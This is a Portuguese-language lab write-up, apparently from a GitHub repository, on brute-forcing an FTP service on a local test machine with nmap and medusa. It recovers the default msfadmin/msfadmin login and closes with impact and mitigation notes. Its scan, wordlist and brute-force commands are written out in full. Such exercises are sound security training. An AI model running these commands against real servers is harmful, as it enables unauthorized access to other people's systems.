# FTP Brute Force Attack

## Descrição

O serviço FTP (File Transfer Protocol) permite a transferência de arquivos entre sistemas. Quando configurado com credenciais fracas, torna-se vulnerável a ataques de brute force, permitindo acesso não autorizado.

## Enumeração

Foi identificado que a porta 21 (FTP) estava aberta na máquina alvo:

```bash id="k6q1vd"
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

## Exploração

### Criação das listas de usuários e senhas:

```bash id="3w3pyy"
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### Execução do ataque de brute force:

```bash id="1xldk3"
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

## Resultado

Credenciais válidas foram encontradas:

* Usuário: **msfadmin**
* Senha: **msfadmin**

## Validação de acesso

Foi realizado login com sucesso no serviço FTP:

```bash id="a6l0hm"
ftp 192.168.56.101
```

## Evidências

### Ataque com Medusa

<img width="1254" height="347" alt="image" src="https://github.com/user-attachments/assets/5ce24022-be88-43e9-811c-ec625ac7c810" />

### Login bem-sucedido

<img width="318" height="188" alt="image" src="https://github.com/user-attachments/assets/b27cbe90-223b-4871-8348-65bc865371dd" />

## Impacto

* Acesso não autorizado ao servidor FTP
* Possibilidade de leitura, modificação ou exclusão de arquivos
* Comprometimento do sistema

## Mitigação

* Uso de senhas fortes
* Bloqueio após múltiplas tentativas de login
* Implementação de autenticação multifator (MFA)
* Monitoramento de tentativas de acesso

## Análise

A vulnerabilidade ocorre devido ao uso de credenciais fracas e ausência de mecanismos de proteção contra brute force, permitindo que um atacante descubra senhas válidas através de tentativas automatizadas.
